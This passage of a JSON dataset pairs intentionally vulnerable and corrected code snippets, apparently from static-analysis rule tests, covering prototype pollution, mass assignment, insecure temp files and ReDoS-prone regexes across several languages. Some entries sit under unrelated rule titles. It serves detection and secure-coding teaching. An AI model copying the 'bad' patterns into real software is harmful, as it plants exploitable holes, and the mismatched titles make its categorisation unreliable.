    "code": "using Microsoft.Extensions.Logging;\nusing Serilog;\nusing NLog;\n\nclass Program\n{\n    public static void SerilogSample()\n    {\n        using var serilog = new LoggerConfiguration().WriteTo.Console().CreateLogger();\n\n        var position = new { Latitude = 25, Longitude = 134 };\n        var elapsedMs = 34;\n\n        // ok: structured-logging\n        serilog.Information(\"Processed {@Position} in {Elapsed:000} ms.\", position, elapsedMs);\n    }\n\n    public static void MicrosoftSample()\n    {\n        var loggerFactory = LoggerFactory.Create(builder => {\n                builder.AddConsole();\n            }\n        );\n\n        var logger = loggerFactory.CreateLogger<Program>();\n\n        var position = new { Latitude = 25, Longitude = 134 };\n        var elapsedMs = 34;\n\n        // ok: structured-logging\n        logger.LogInformation(\"Processed {@Position} in {Elapsed:000} ms.\", position, elapsedMs);\n    }\n\n    public static void NLogSample()\n    {\n        var logger = NLog.LogManager.Setup().LoadConfiguration(builder => {\n            builder.ForLogger().WriteToConsole();\n        }).GetCurrentClassLogger();\n\n        var position = new { Latitude = 25, Longitude = 134 };\n        var elapsedMs = 34;\n\n        // ok: structured-logging\n        logger.Info(\"Processed {@Position} in {Elapsed:000} ms.\", position, elapsedMs);\n    }\n}",
    "language": "csharp",
    "description": "CORRECT** - Pass variables as structured arguments example for Performance Best Practices"
  },
  {
    "ruleId": "",
    "ruleTitle": "Performance Best Practices",
    "type": "bad",
    "code": "import styled from \"styled-components\";\n\nfunction FunctionalComponent() {\n  // ruleid: define-styled-components-on-module-level\n  const ArbitraryComponent3 = styled.div`\n    color: blue;\n  `\n  return <ArbitraryComponent3 />\n}\n\nfunction FunctionalComponent2() {\n  // ruleid: define-styled-components-on-module-level\n  const ArbitraryComponent3 = styled(FunctionalComponent)`\n    color: blue;\n  `\n  return <ArbitraryComponent3 />\n}\n\nclass ClassComponent {\n  public render() {\n    // ruleid: define-styled-components-on-module-level\n    const ArbitraryComponent4 = styled.div`\n        color: blue;\n    `\n    return <ArbitraryComponent4 />\n  }\n}",
    "language": "tsx",
    "description": "INCORRECT** - Styled component declared inside function/class example for Performance Best Practices"
  },
  {
    "ruleId": "",
    "ruleTitle": "Performance Best Practices",
    "type": "good",
    "code": "import styled from \"styled-components\";\n\n// ok: define-styled-components-on-module-level\nconst ArbitraryComponent = styled.div`\n  color: blue;\n`\n// ok: define-styled-components-on-module-level\nconst ArbitraryComponent2 = styled(ArbitraryComponent)`\n  color: blue;\n`\n\nfunction FunctionalComponent() {\n  return <ArbitraryComponent />\n}",
    "language": "tsx",
    "description": "CORRECT** - Styled component declared at module level example for Performance Best Practices"
  },
  {
    "ruleId": "",
    "ruleTitle": "Performance Best Practices",
    "type": "bad",
    "code": "let test xs =\n  (* ruleid:ocamllint-length-list-zero *)\n  if List.length xs = 0\n  then 1\n  else 2\n\nlet test2 xs =\n  (* ruleid:ocamllint-length-more-than-zero *)\n  if List.length xs > 0\n  then 1\n  else 2",
    "language": "ocaml",
    "description": "INCORRECT** - Using List.length for empty check example for Performance Best Practices"
  },
  {
    "ruleId": "",
    "ruleTitle": "Performance Best Practices",
    "type": "good",
    "code": "let test xs =\n  (* ok:ocamllint-length-list-zero *)\n  if xs = []\n  then 1\n  else 2\n\nlet test2 xs =\n  (* ok:ocamllint-length-more-than-zero *)\n  if xs <> []\n  then 1\n  else 2",
    "language": "ocaml",
    "description": "CORRECT** - Compare directly against empty list example for Performance Best Practices"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Prototype Pollution",
    "type": "bad",
    "code": "app.get('/test/:id', (req, res) => {\n    let id = req.params.id;\n    let items = req.session.todos[id];\n    if (!items) {\n        items = req.session.todos[id] = {};\n    }\n    // ruleid: prototype-pollution-assignment\n    items[req.query.name] = req.query.text;\n    res.end(200);\n});",
    "language": "javascript",
    "description": "vulnerable to prototype pollution via dynamic assignment"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Prototype Pollution",
    "type": "good",
    "code": "app.post('/testOk/:id', (req, res) => {\n    let id = req.params.id;\n    if (id !== 'constructor' && id !== '__proto__') {\n        let items = req.session.todos[id];\n        if (!items) {\n            items = req.session.todos[id] = {};\n        }\n        // ok: prototype-pollution-assignment\n        items[req.query.name] = req.query.text;\n    }\n    res.end(200);\n});",
    "language": "javascript",
    "description": "validate against dangerous keys"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Prototype Pollution",
    "type": "good",
    "code": "function ok1(req, res) {\n    let items = req.session.todos[\"id\"];\n    if (!items) {\n        items = req.session.todos[\"id\"] = {};\n    }\n    // ok: prototype-pollution-assignment\n    items[req.query.name] = req.query.text;\n    res.end(200);\n}\n\nfunction ok2(req, res) {\n    let id = req.params.id;\n    let items = req.session.todos[id];\n    if (!items) {\n        items = req.session.todos[id] = {};\n    }\n    // ok: prototype-pollution-assignment\n    items[\"name\"] = req.query.text;\n    res.end(200);\n}",
    "language": "javascript",
    "description": "use static keys"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Prototype Pollution",
    "type": "bad",
    "code": "function test1(name, value) {\n  if (name.indexOf('.') === -1) {\n    this.config[name] = value;\n    return this;\n  }\n  let config = this.config;\n  name = name.split('.');\n\n  const length = name.length;\n  name.forEach((item, index) => {\n    if (index === length - 1) {\n      config[item] = value;\n    } else {\n      if (!helper.isObject(config[item])) {\n        config[item] = {};\n      }\n      // ruleid:prototype-pollution-loop\n      config = config[item];\n    }\n  });\n  return this;\n}\n\nfunction test2(obj, props, value) {\n  if (typeof props == 'string') {\n    props = props.split('.');\n  }\n  if (typeof props == 'symbol') {\n    props = [props];\n  }\n  var lastProp = props.pop();\n  if (!lastProp) {\n    return false;\n  }\n  var thisProp;\n  while ((thisProp = props.shift())) {\n    if (typeof obj[thisProp] == 'undefined') {\n      obj[thisProp] = {};\n    }\n    // ruleid:prototype-pollution-loop\n    obj = obj[thisProp];\n    if (!obj || typeof obj != 'object') {\n      return false;\n    }\n  }\n  obj[lastProp] = value;\n  return true;\n}\n\nfunction test3(obj, prop, val) {\n  const segs = split(prop);\n  const last = segs.pop();\n  while (segs.length) {\n    const key = segs.shift();\n    // ruleid:prototype-pollution-loop\n    obj = obj[key] || (obj[key] = {});\n  }\n  obj[last] = val;\n}",
    "language": "javascript",
    "description": "prototype pollution in loops"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Prototype Pollution",
    "type": "good",
    "code": "function okTest1(name) {\n  if (name.indexOf('.') === -1) {\n    this.config[name] = value;\n    return this;\n  }\n  let config = this.config;\n  name = name.split('.');\n\n  const length = name.length;\n  name.forEach((item, index) => {\n    // ok:prototype-pollution-loop\n    config = config[index];\n  });\n  return this;\n}\n\nfunction okTest2(name) {\n  let config = this.config;\n  name = name.split('.');\n\n  const length = name.length;\n  for (let i = 0; i < name.length; i++) {\n    // ok:prototype-pollution-loop\n    config = config[i];\n  }\n  return this;\n}",
    "language": "javascript",
    "description": "use numeric index in loops"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Prototype Pollution",
    "type": "bad",
    "code": "const express = require('express')\nconst app = express()\nconst port = 3000\n\nfunction testController1(req, res) {\n    try {\n        const defaultData = {foo: true}\n        // ruleid: express-data-exfiltration\n        let data = Object.assign(defaultData, req.query)\n        doSmthWith(data)\n    } catch (err) {\n        this.log.error(err);\n    }\n    res.end('ok')\n};\napp.get('/test1', testController1)\n\nlet testController2 = function (req, res) {\n    const defaultData = {foo: {bar: true}}\n    // ruleid: express-data-exfiltration\n    let data = Object.assign(defaultData, {foo: req.query})\n    doSmthWith(data)\n    return res.send({ok: true})\n\n}\napp.get('/test2', testController2)\n\nvar testController3 = null;\ntestController3 = function (req, res) {\n    const defaultData = {foo: true}\n    let newData = req.body\n    // ruleid: express-data-exfiltration\n    let data = Object.assign(defaultData, newData)\n    doSmthWith(data)\n    return res.send({ok: true})\n}\napp.get('/test3', testController3)",
    "language": "javascript",
    "description": "mass assignment via Object.assign in Express"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Prototype Pollution",
    "type": "good",
    "code": "let okController = function (req, res) {\n    const defaultData = {foo: {bar: true}}\n    // ok: express-data-exfiltration\n    let data = Object.assign(defaultData, {foo: getFoo()})\n    doSmthWith(data)\n    return res.send({ok: true})\n}\napp.get('/ok-test2', okController)",
    "language": "javascript",
    "description": "use safe data sources in Object.assign"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Prototype Pollution",
    "type": "bad",
    "code": "params = ActionController::Parameters.new({\n  person: {\n    name: \"Francesco\",\n    age:  22,\n    role: \"admin\"\n  }\n})\n\n#ruleid: check-permit-attributes-high\nparams.permit(:admin)\n\n# ruleid: check-permit-attributes-medium\nparams.permit(:role_id)",
    "language": "ruby",
    "description": "permitting dangerous attributes"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Prototype Pollution",
    "type": "good",
    "code": "#ok: check-permit-attributes-high\nparams.permit(:some_safe_property)\n\n#ok: check-permit-attributes-medium\nparams.permit(:some_safe_property)",
    "language": "ruby",
    "description": "permit only safe attributes"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Prototype Pollution",
    "type": "bad",
    "code": "class Bad_attr_accessible\n   include  ActiveModel::MassAssignmentSecurity\n\n   # ruleid: model-attr-accessible\n   attr_accessible :name, :admin,\n                   :telephone, as: :create_params\n   # ruleid: model-attr-accessible\n   attr_accessible :name, :banned,\n                   as: :create_params\n   # ruleid: model-attr-accessible\n   attr_accessible :role,\n                   :telephone, as: :create_params\n   # ruleid: model-attr-accessible\n   attr_accessible :name,\n                   :account_id, as: :create_params\n\n   # ruleid: model-attr-accessible\n   User.new(params.permit(:name, :admin))\n   # ruleid: model-attr-accessible\n   params_with_conditional_require(ctrl.params).permit(:name, :age, :admin)\n\n   # ruleid: model-attr-accessible\n   User.new(params.permit(:role))\n   # ruleid: model-attr-accessible\n   User.new(params.permit(:banned, :name))\n   # ruleid: model-attr-accessible\n   User.new(params.permit(:address, :account_id, :age))\n\n   # ruleid: model-attr-accessible\n   params.permit!\nend",
    "language": "ruby",
    "description": "dangerous attr_accessible and permit usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Prototype Pollution",
    "type": "good",
    "code": "class Ok_attr_accessible\n   # ok: model-attr-accessible\n   attr_accessible :name, :address, :age,\n                   :telephone, as: :create_params\n   # ok: model-attr-accessible\n   User.new(params.permit(:address, :acc, :age))\n   # ok: model-attr-accessible\n   params_with_conditional_require(ctrl.params).permit(:name, :address, :age)\nend",
    "language": "ruby",
    "description": "safe attr_accessible and permit usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Prototype Pollution",
    "type": "bad",
    "code": "def bad_create_with\n    # ruleid: create-with\n    user.blog_posts.create_with(params[:blog_post]).create\nend",
    "language": "ruby",
    "description": "create_with bypasses strong parameters"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Prototype Pollution",
    "type": "good",
    "code": "def create\n    # ok: create-with\n    user.blog_posts.create(params[:blog_post])\n    # ok: create-with\n    user.blog_posts.create_with(params[:blog_post].permit(:title, :body, :etc)).create\nend",
    "language": "ruby",
    "description": "use permit with create_with"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Prototype Pollution",
    "type": "bad",
    "code": "def mass_assign_unsafe\n    #ruleid: mass-assignment-vuln\n    User.new(params[:user])\n    #ruleid: mass-assignment-vuln\n    user = User.new(params[:user])\n    #ruleid: mass-assignment-vuln\n    User.new(params[:user], :without_protection => true)\nend",
    "language": "ruby",
    "description": "mass assignment without attr_accessible"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Prototype Pollution",
    "type": "good",
    "code": "def safe_send\n    #ok: mass-assignment-vuln\n    attr_accessible :name\n    User.new(params[:user])\n\n    #ok: mass-assignment-vuln\n    attr_accessible :name\n    user = User.new(params[:user])\nend",
    "language": "ruby",
    "description": "use attr_accessible before mass assignment"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Prototype Pollution",
    "type": "bad",
    "code": "# ruleid:mass-assignment-protection-disabled\nUser.new(params[:user], :without_protection => true)",
    "language": "ruby",
    "description": "disabling mass assignment protection"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Prototype Pollution",
    "type": "good",
    "code": "# ok:mass-assignment-protection-disabled\nUser.new(params[:user])",
    "language": "ruby",
    "description": "do not disable protection"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Prototype Pollution",
    "type": "bad",
    "code": "# ruleid: model-attributes-attr-accessible\nclass User < ActiveRecord::Base\nacts_as_authentic do |t|\n    t.login_field=:login # for available options see documentation in: Authlogic::ActsAsAuthentic\n  end # block optional\n    has_attached_file :avatar, :styles => { :medium => \"300x300>\", :thumb => \"100x100>\" }\nend\n\ndef create\n    user = User.create(person_params)\nend",
    "language": "ruby",
    "description": "model without attr_accessible"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Prototype Pollution",
    "type": "good",
    "code": "class User < ActiveRecord::Base\nacts_as_authentic do |t|\n    t.login_field=:login # for available options see documentation in: Authlogic::ActsAsAuthentic\n  end # block optional\n    attr_accessible :login\n  attr_accessible :first_name\n    attr_accessible :middle_name\n    attr_accessible :surname\n    attr_accessible :permanent_address\n    attr_accessible :correspondence_address\n    attr_accessible :email\n    attr_accessible :contact_no\n    attr_accessible :gender\n    attr_accessible :password\n    attr_accessible :password_confirmation\n    attr_accessible :avatar\n    has_attached_file :avatar, :styles => { :medium => \"300x300>\", :thumb => \"100x100>\" }\nend\n\ndef create\n    user = User.create(person_params)\nend",
    "language": "ruby",
    "description": "model with attr_accessible"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Prototype Pollution",
    "type": "bad",
    "code": "from django.shortcuts import render\nfrom myapp.models import Whatzit\n\n# Test cases borrowed from https://gist.github.com/jsocol/3217262\n\ndef create_whatzit(request):\n    # ruleid: mass-assignment\n    Whatzit.objects.create(**request.POST)\n    return render(request, 'created.html')\n\ndef update_whatzit(request, id):\n    whatzit = Whatzit.objects.filter(pk=id)\n    # ruleid: mass-assignment\n    whatzit.update(**request.POST)\n    whatzit.save()\n    return render(request, 'saved.html')",
    "language": "python",
    "description": "mass assignment using **request"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Prototype Pollution",
    "type": "good",
    "code": "def good_whatzit(request):\n    # ok: mass-assignment\n    Whatzit.objects.create(\n        name=request.POST.get('name'),\n        dob=request.POST.get('dob')\n    )\n    return render(request, 'created.html')",
    "language": "python",
    "description": "explicitly assign each field"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Prototype Pollution",
    "type": "bad",
    "code": "<?php\n\nnamespace App\\Models;\n\nuse Illuminate\\Database\\Eloquent\\Model;\n\nclass Flight extends Model\n{\n    /**\n     * The primary key associated with the table.\n     *\n     * @var string\n     */\n    protected $primaryKey = 'flight_id';\n\n    /**\n    * The attributes that aren't mass assignable.\n    *\n    * @var array\n    */\n    // ruleid: laravel-dangerous-model-construction\n    protected $guarded = [];\n}",
    "language": "php",
    "description": "empty $guarded allows mass assignment"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Prototype Pollution",
    "type": "good",
    "code": "<?php\n\nnamespace App\\Models;\n\nuse Illuminate\\Database\\Eloquent\\Model;\n\nclass Flight extends Model\n{\n    /**\n     * The attributes that are mass assignable.\n     *\n     * @var array\n     */\n    protected $fillable = ['name', 'destination'];\n}",
    "language": "php",
    "description": "use $fillable to explicitly allowlist attributes"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Prototype Pollution",
    "type": "bad",
    "code": "using Microsoft.AspNetCore.Mvc;\n\npublic IActionResult Create(UserModel model)\n{\n    context.SaveChanges();\n    // ruleid: mass-assignment\n    return View(\"Index\", model);\n}",
    "language": "csharp",
    "description": "model binding without [Bind] attribute"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Prototype Pollution",
    "type": "good",
    "code": "using Microsoft.AspNetCore.Mvc;\n\npublic IActionResult Create([Bind(nameof(UserModel.Name))] UserModel model)\n{\n    context.SaveChanges();\n    // ok: mass-assignment\n    return View(\"Index\", model);\n}\n\n[HttpGet(\"/\")]\npublic IActionResult Index()\n{\n    // ok: mass-assignment\n    return NoContent();\n}",
    "language": "csharp",
    "description": "use [Bind] attribute to allowlist properties"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Race Conditions",
    "type": "bad",
    "code": "(* ruleid:ocamllint-tempfile *)\nlet ofile = Filename.temp_file \"test\" \"\" in\nPrintf.printf \"%s\\n\" ofile",
    "language": "ocaml",
    "description": "vulnerable to race condition"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Race Conditions",
    "type": "good",
    "code": "(* Use open_temp_file which returns both the filename and an open channel *)\nlet (filename, oc) = Filename.open_temp_file \"test\" \"\" in\nPrintf.fprintf oc \"data\\n\";\nclose_out oc",
    "language": "ocaml",
    "description": "use safer alternatives"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Race Conditions",
    "type": "bad",
    "code": "import tempfile as tf\n\n# ruleid: tempfile-insecure\nx = tempfile.mktemp()\n# ruleid: tempfile-insecure\nx = tempfile.mktemp(dir=\"/tmp\")",
    "language": "python",
    "description": "vulnerable to race condition"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Race Conditions",
    "type": "good",
    "code": "import tempfile\n\n# Use NamedTemporaryFile which atomically creates and opens the file\nwith tempfile.NamedTemporaryFile(mode='w', delete=False) as f:\n    f.write(\"data\")\n    filename = f.name\n\n# Or use mkstemp which returns both file descriptor and name\nfd, path = tempfile.mkstemp()\ntry:\n    with os.fdopen(fd, 'w') as f:\n        f.write(\"data\")\nfinally:\n    os.unlink(path)",
    "language": "python",
    "description": "use secure alternatives"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Race Conditions",
    "type": "bad",
    "code": "def test1():\n    # ruleid:hardcoded-tmp-path\n    f = open(\"/tmp/blah.txt\", 'w')\n    f.write(\"hello world\")\n    f.close()\n\ndef test2():\n    # ruleid:hardcoded-tmp-path\n    f = open(\"/tmp/blah/blahblah/blah.txt\", 'r')\n    data = f.read()\n    f.close()\n\ndef test4():\n    # ruleid:hardcoded-tmp-path\n    with open(\"/tmp/blah.txt\", 'r') as fin:\n        data = fin.read()",
    "language": "python",
    "description": "hardcoded tmp path"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Race Conditions",
    "type": "good",
    "code": "def test3():\n    # ok:hardcoded-tmp-path\n    f = open(\"./tmp/blah.txt\", 'w')\n    f.write(\"hello world\")\n    f.close()\n\ndef test3a():\n    # ok:hardcoded-tmp-path\n    f = open(\"/var/log/something/else/tmp/blah.txt\", 'w')\n    f.write(\"hello world\")\n    f.close()\n\ndef test5():\n    # ok:hardcoded-tmp-path\n    with open(\"./tmp/blah.txt\", 'w') as fout:\n        fout.write(\"hello world\")",
    "language": "python",
    "description": "use tempfile module or relative paths"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Race Conditions",
    "type": "bad",
    "code": "package samples\n\nimport (\n\t\"fmt\"\n\t\"io/ioutil\"\n)\n\nfunc main() {\n\t// ruleid:bad-tmp-file-creation\n\terr := ioutil.WriteFile(\"/tmp/demo2\", []byte(\"This is some data\"), 0644)\n\tif err != nil {\n\t\tfmt.Println(\"Error while writing!\")\n\t}\n}",
    "language": "go",
    "description": "hardcoded tmp path"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Race Conditions",
    "type": "good",
    "code": "import \"os\"\n\nfunc secureTemp() error {\n    // Atomically creates a file with a random suffix\n    f, err := os.CreateTemp(\"\", \"prefix-*.txt\")\n    if err != nil {\n        return err\n    }\n    defer f.Close()\n\n    _, err = f.WriteString(\"secure data\")\n    return err\n}",
    "language": "go",
    "description": "use TempFile for atomic creation"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Regular Expression DoS",
    "type": "bad",
    "code": "// ruleid: detect-redos\nconst re = new RegExp(\"([a-z]+)+$\", \"i\");\n// ruleid: detect-redos\nconst re = new RegExp(/([a-z]+)+$/, \"i\");\n\nvar r = /^\\w+([-_+.]\\w+)*@\\w+([-.]\\w+)*\\.\\w+([-.]\\w+)*$/\n// ruleid: detect-redos\nnew RegExp(r, \"i\");\n// ruleid: detect-redos\nr.test(a)\n// ruleid: detect-redos\n\"a\".match(r)",
    "language": "javascript",
    "description": "vulnerable ReDoS pattern"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Regular Expression DoS",
    "type": "good",
    "code": "// ok: detect-redos\n\"a\".match(b)\n// ok: detect-redos\n\"a\".match(\"([a-z])\")\nvar c = /([a-z])/\n// ok: detect-redos\nc.test(a)",
    "language": "javascript",
    "description": "safe regex patterns"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Regular Expression DoS",
    "type": "bad",
    "code": "function bad (name) {\n  //ruleid: detect-non-literal-regexp\n  const reg = new RegExp(\"\\\\w+\" + name)\n  return reg.exec(name)\n}",
    "language": "javascript",
    "description": "non-literal RegExp with user input"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Regular Expression DoS",
    "type": "good",
    "code": "function ok (name) {\n  //ok: detect-non-literal-regexp\n  const reg = new RegExp(\"\\\\w+\")\n  return reg.exec(name)\n}\n\nfunction jsliteral (name) {\n  const exp = /a.*/;\n  //ok: detect-non-literal-regexp\n  const reg = new RegExp(exp);\n  return reg.exec(name);\n}",
    "language": "javascript",
    "description": "hardcoded regex patterns"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Regular Expression DoS",
    "type": "bad",
    "code": "function escapeQuotes(s) {\n    // ruleid:incomplete-sanitization\n    return s.replace(\"'\", \"''\");\n}\n\nfunction removeTabs(s) {\n    // ruleid:incomplete-sanitization\n    return s.replace('\\t', \"\");\n}\n\nfunction escapeHtml(html) {\n  // ruleid:incomplete-sanitization\n  return html\n    .replace(\"<\", \"\")\n    .replace(\">\", \"\");\n}",
    "language": "javascript",
    "description": "incomplete string sanitization"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Regular Expression DoS",
    "type": "good",
    "code": "function okTest(s) {\n    return s.replace(\"foo\", \"bar\");\n}\n\nfunction okEscapeQuotes(s) {\n    return s.replace(/'/g, \"''\");\n}",
    "language": "javascript",
    "description": "use regex with global flag"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Regular Expression DoS",
    "type": "good",
    "code": "function okTest1() {\n    // ok: ajv-allerrors-true\n    let ajv = new Ajv({ allErrors: process.env.DEBUG });\n    ajv.addSchema(schema, 'input');\n}\n\nfunction okTest2() {\n    // ok: ajv-allerrors-true\n    var ajv = new Ajv({  smth: 'else', allErrors: false });\n    ajv.addSchema(schema, 'input');\n}",
    "language": "javascript",
    "description": "disable allErrors in production"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Regular Expression DoS",
    "type": "bad",
    "code": "const corsDomains = [\n  /localhost\\:/,\n  /(.+\\.)*foo\\.com$/,\n  /(.+\\.)*foobar\\.com$/, // matches *.foobar.com,\n  // ruleid: cors-regex-wildcard\n  /^(http|https):\\/\\/(qix|qux).biz.baz.foobar.com$/,\n  /^(http|https):\\/\\/www\\.bar\\.com$/,\n  // ruleid: cors-regex-wildcard\n  /^(http|https):\\/\\/www.foo.com$/,\n];\n\nconst CORS = [\n  /localhost\\:/,\n  /(.+\\.)*foo\\.com$/,\n  /(.+\\.)*foobar\\.com$/, // matches *.foobar.com,\n  // ruleid: cors-regex-wildcard\n  /^(http|https):\\/\\/(qix|qux).biz.baz.foobar.com$/,\n  /^(http|https):\\/\\/www\\.bar\\.com$/,\n  // ruleid: cors-regex-wildcard\n  /^(http|https):\\/\\/www.foo.com$/,\n];\n\n// ruleid: cors-regex-wildcard\nconst corsOrigin = /^(http|https):\\/\\/www.foo.com$/;",
    "language": "typescript",
    "description": "CORS regex with unescaped dots"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Regular Expression DoS",
    "type": "good",
    "code": "const urls = [\n  /localhost\\:/,\n  /(.+\\.)*foo\\.com$/,\n  /(.+\\.)*foobar\\.com$/, // matches *.foobar.com,\n  /^(http|https):\\/\\/(qix|qux).biz.baz.foobar.com$/,\n  /^(http|https):\\/\\/www\\.bar\\.com$/,\n  /^(http|https):\\/\\/www.foo.com$/,\n];",
    "language": "typescript",
    "description": "escape dots in CORS regex"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Regular Expression DoS",
    "type": "bad",
    "code": "import re\n\nredos = r\"^(a+)+$\"\nregex = r\"^[0-9]+$\"\n\ndata = \"foo\"\n\n# ruleid: regex_dos\npattern = re.compile(redos)\npattern.search(data)\n\n# ruleid: regex_dos\npattern = re.compile(redos)\npattern.match(data)\n\n# ruleid: regex_dos\npattern = re.compile(redos)\npattern.findall(data)",
    "language": "python",
    "description": "inefficient regex pattern"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Regular Expression DoS",
    "type": "good",
    "code": "import re\n\nredos = r\"^(a+)+$\"\nregex = r\"^[0-9]+$\"\n\ndata = \"foo\"\n\n# ok: regex_dos\npattern = re.compile(regex)\npattern.search(data)\n\n# ok: regex_dos\npattern = re.compile(regex)\npattern.fullmatch(data)\n\n# ok: regex_dos\npattern = re.compile(regex)\npattern.split(data)\n\n# ok: regex_dos\npattern.escape(redos)\n\n# ok: regex_dos\npattern = re.compile(redos)\npattern.purge()",
    "language": "python",
    "description": "safe regex patterns"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Regular Expression DoS",
    "type": "bad",
    "code": "# ruleid: missing-throttle-config\nREST_FRAMEWORK = {\n    'PAGE_SIZE': 10\n}",
    "language": "python",
    "description": "missing Django REST Framework throttle config"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Regular Expression DoS",
    "type": "good",
    "code": "# ok: missing-throttle-config\nREST_FRAMEWORK = {\n    'PAGE_SIZE': 10,\n    'DEFAULT_THROTTLE_CLASSES': [\n        'rest_framework.throttling.AnonRateThrottle',\n        'rest_framework.throttling.UserRateThrottle'\n    ],\n    'DEFAULT_THROTTLE_RATES': {\n        'anon': '100/day',\n        'user': '1000/day'\n    },\n    \"SOMETHING_ELSE\": {1: 2}\n}",
    "language": "python",
    "description": "throttle config enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Regular Expression DoS",
    "type": "bad",
    "code": "def some_rails_controller\n  foo = params[:some_regex]\n  #ruleid: check-regex-dos\n  Regexp.new(foo).match(\"some_string\")\nend\n\ndef some_rails_controller\n  foo = Record[something]\n  #ruleid: check-regex-dos\n  Regexp.new(foo).match(\"some_string\")\nend\n\ndef some_rails_controller\n  foo = Record.read_attribute(\"some_attribute\")\n  #ruleid: check-regex-dos\n  Regexp.new(foo).match(\"some_string\")\nend\n\ndef use_params_in_regex\n#ruleid: check-regex-dos\n@x = something.match /#{params[:x]}/\nend",
    "language": "ruby",
    "description": "user-controlled regex"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Regular Expression DoS",
    "type": "good",
    "code": "def some_rails_controller\n  bar = ENV['someEnvVar']\n  #ok: check-regex-dos\n  Regexp.new(bar).match(\"some_string\")\nend\n\ndef regex_on_params\n#ok: check-regex-dos\n@x = params[:x].match /foo/\nend",
    "language": "ruby",
    "description": "safe regex usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Regular Expression DoS",
    "type": "bad",
    "code": "class Account < ActiveRecord::Base\n  #ruleid: check-validation-regex\n  validates :username, :length => 6..20, :format => /([a-z][0-9])+/i\n  #ruleid: check-validation-regex\n  validates :phone, :format => { :with => /(\\d{3})-(\\d{3})-(\\d{4})/, :on => :create }, :presence => true\n  #ruleid: check-validation-regex\n  validates :first_name, :format => /\\w+/\n  serialize :cc_info #safe from CVE-2013-0277\n  attr_accessible :blah_admin_blah\nend\n\nclass Account < ActiveRecord::Base\n  #ruleid: check-validation-regex\n  validates_format_of :name, :with => /^[a-zA-Z]+$/\n  #ruleid: check-validation-regex\n  validates_format_of :blah, :with => /\\A[a-zA-Z]+$/\n  #ruleid: check-validation-regex\n  validates_format_of :blah2, :with => /^[a-zA-Z]+\\Z/\n  #ruleid: check-validation-regex\n  validates_format_of :something, :with => /[a-zA-Z]\\z/\nend",
    "language": "ruby",
    "description": "incorrectly-bounded Rails validation regex"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Regular Expression DoS",
    "type": "good",
    "code": "class Account < ActiveRecord::Base\n  #ok: check-validation-regex\n  validates_format_of :good_valid, :with => /\\A[a-zA-Z]\\z/ #No warning\n  #ok: check-validation-regex\n  validates_format_of :not_bad, :with => /\\A[a-zA-Z]\\Z/ #No warning\nend",
    "language": "ruby",
    "description": "properly-bounded regex with \\A and \\Z"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Regular Expression DoS",
    "type": "bad",
    "code": "using System.Text.RegularExpressions;\n\nnamespace RegularExpressionsDos\n{\n    public class RegularExpressionsDos\n    {\n        // ruleid: regular-expression-dos\n        public void ValidateRegex(string search)\n        {\n            Regex rgx = new Regex(\"^A(B|C+)+D\");\n            rgx.Match(search);\n\n        }\n\n        // ruleid: regular-expression-dos\n        public void ValidateRegex2(string search)\n        {\n            Regex rgx = new Regex(\"^A(B|C+)+D\", new RegexOptions { });\n            rgx.Match(search);\n\n        }\n\n        // ruleid: regular-expression-dos\n        public void Validate4(string search)\n        {\n            var pattern = @\"^A(B|C+)+D\";\n            var result = Regex.Match(search, pattern);\n        }\n\n        // ruleid: regular-expression-dos\n        public void Validate5(string search)\n        {\n            var pattern = @\"^A(B|C+)+D\";\n            var result = Regex.Match(search, pattern, new RegexOptions { });\n        }\n    }\n}",
    "language": "csharp",
    "description": "regex without timeout on untrusted input"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Regular Expression DoS",
    "type": "good",
